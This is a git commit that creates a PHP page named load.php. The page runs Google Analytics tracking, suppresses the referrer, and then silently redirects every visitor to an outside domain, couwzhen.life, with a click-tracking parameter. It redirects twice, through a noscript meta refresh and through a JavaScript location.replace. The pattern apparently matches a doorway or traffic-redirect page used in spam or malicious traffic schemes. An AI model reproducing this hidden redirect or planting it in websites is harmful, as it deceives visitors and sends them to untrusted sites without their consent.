0fca9b6ea485aca2daef92d4dd317e8f1fd93b2b
ksmtrck <rianrambur@gmail.com>
2017-07-24 16:49:55 +0700

    Create load.php

---
+++ load.php
@@ -0,0 +1,14 @@
+
+
+<head><meta name="referrer" content="never">
+<script type="text/javascript">
+(function(i,s,o,g,r,a,m){i["GoogleAnalyticsObject"]=r;i[r]=i[r]||function(){ 
+(i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o), 
+m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m) 
+})(window,document,"script","https://www.google-analytics.com/analytics.js","ga"); 
+ga("create", "UA-84047128-1", "auto"); 
+ga("send", "pageview"); 
+</script> 
+
+<noscript><META http-equiv="refresh" content="0;URL=http://couwzhen.life/?clk=1500889853&sid1=&sid2="></noscript></head><script>window.opener = null; location.replace("http://couwzhen.life/?clk=1500889853&sid1=&sid2=")</script>
+				
